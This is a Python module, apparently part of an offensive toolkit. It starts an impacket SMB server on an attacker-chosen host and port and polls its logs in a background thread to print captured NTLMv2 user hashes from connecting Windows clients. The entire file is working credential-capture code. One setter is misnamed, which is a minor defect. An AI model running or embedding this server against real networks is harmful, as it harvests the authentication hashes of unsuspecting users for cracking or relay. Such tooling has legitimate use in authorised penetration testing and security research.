from threading import Thread
from impacket import smbserver
from io import StringIO
import logging
import sys
from .interceptlogging import InterceptHandler
from time import sleep
import re


class SmbServer:
    def __init__(self, lhost: str, port: str, output=sys.stdout) -> None:
        self._lhost = lhost
        self._port = port
        self._output = output
        self._log_stream = StringIO()

        logging.basicConfig(handlers=[InterceptHandler()], level=0)
        console = logging.StreamHandler(self.log_stream)
        console.setLevel(logging.INFO)
        logging.getLogger("").addHandler(console)

    @property
    def log_stream(self):
        return self._log_stream

    @property
    def lhost(self) -> str:
        return self._lhost

    @property
    def port(self) -> str:
        return self._port

    @property
    def output(self):
        return self._output

    @lhost.setter
    def iface(self, lhost: str) -> None:
        self._lhost = lhost

    @port.setter
    def port(self, port) -> None:
        self._port = port

    @output.setter
    def output(self, output) -> None:
        self._output = output

    @log_stream.setter
    def log_stream(self, stream):
        self._log_stream = stream

    def find_user(self):
        pattern = re.compile(r"^.*::")
        matches = pattern.finditer(self.log_stream.getvalue())
        for match in matches:
            print(match)

    def show_ntlmv2(self):
        while True:
            sleep(2)
            if self.log_stream.getvalue() != "":
                self.find_user()
                print(self.log_stream.getvalue())

    def start_smbserver(self) -> None:
        show_ntlmv2_thread = Thread(target=self.show_ntlmv2)
        show_ntlmv2_thread.daemon = True
        show_ntlmv2_thread.start()

        server = smbserver.SimpleSMBServer(
            listenAddress=self.lhost, listenPort=int(self.port)
        )
        server.setSMBChallenge("")
        server.start()
